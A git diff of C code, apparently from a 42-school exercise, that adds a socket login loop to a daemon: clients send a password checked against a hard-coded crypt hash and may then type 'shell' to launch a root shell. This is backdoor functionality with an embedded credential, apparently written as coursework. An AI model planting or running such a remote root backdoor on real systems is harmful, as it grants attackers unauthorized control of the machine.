@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/05 10:27:26 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/06 13:34:31 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/06 16:51:20 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,35 +28,56 @@ pthread_attr_t		thread_init()
 	return (thread_attr);
 }
 
-static void			handle_buffer(t_thread_params *c, char *buffer)
+static void			loop(t_thread_params *c, char *buffer, int *ret)
 {
-	char			salt[] = "A9";
 	char const		*pass = "A9ydQdSSfi/JY";
+	char			salt[] = "A9";
 	char			*message;
 	char			str[256];
+	bool			is_logged = false;
 
-	char *trim = strtrim(buffer);
-	bzero(str, sizeof(str));
-	if (!trim)
-	{
-		print_logs(c->logs, "Malloc error");
-		return ;
+	while ((*ret = recv(c->sock, buffer, BUF_SIZE, 0)) > 0) {
+		char *trim = strtrim(buffer);
+		bzero(str, sizeof(str));
+		if (!trim)
+		{
+			print_logs(c->logs, "Malloc error");
+			return ;
+		}
+		if (!is_logged) {
+			if (!strcmp(crypt(trim, salt), pass)) {
+				message = "[Daemon] Authentication success.\n";
+				snprintf(str, sizeof(str), "[Client %s:%d] %s",
+					c->cli_ip, c->cli_port, message);
+				print_logs_n(c->logs, str);
+				send(c->sock, message, strlen(message), 0);
+				message = "[Daemon] Type \"shell\" to run the root shell.\n";
+				send(c->sock, message, strlen(message), 0);
+				is_logged = true;
+			} else {
+				message = "[Daemon] Authentication failed. Try again.\n";
+				snprintf(str, sizeof(str), "[Client %s:%d] %s",
+					c->cli_ip, c->cli_port, message);
+				print_logs_n(c->logs, str);
+				send(c->sock, message, strlen(message), 0);
+			}
+		} else {
+			if (!strcmp(trim, "shell")) {
+				pthread_mutex_lock(&lock);
+				run(*ret);
+				pthread_mutex_unlock(&lock);
+			} else {
+				message = "[Daemon] Not a valid command. Try again.\n";
+				send(c->sock, message, strlen(message), 0);
+			}
+		}
+		print_logs_n(c->logs, "here");
+		bzero(str, sizeof(str));
+		bzero(buffer, BUF_SIZE);
+		if (trim)
+			free(trim);
 	}
-	if (!strcmp(crypt(trim, salt), pass)) {
-		message = "Authentication success.\n";
-		snprintf(str, sizeof(str), "[Client %s:%d] %s",
-			c->cli_ip, c->cli_port, message);
-	} else {
-		message = "Authentication failed.\n";
-		snprintf(str, sizeof(str), "[Client %s:%d] %s",
-			c->cli_ip, c->cli_port, message);
-	}
-	print_logs_n(c->logs, str);
-	send(c->sock, message, strlen(message), 0);
-	bzero(str, sizeof(str));
-	bzero(buffer, BUF_SIZE);
-	if (trim)
-		free(trim);
+	print_logs_n(c->logs, "here2");
 }
 
 void				*thread_handler(void *context)
@@ -70,8 +91,7 @@ void				*thread_handler(void *context)
 	bzero(buffer, sizeof(buffer));
 	char *message = "Password: ";
     send(c->sock, message, strlen(message), 0);
-    while ((ret = recv(c->sock, buffer, BUF_SIZE, 0)) > 0)
-		handle_buffer(c, buffer);
+	loop(c, buffer, &ret);
     if (ret == 0)
     {
 		pthread_mutex_lock(&lock);
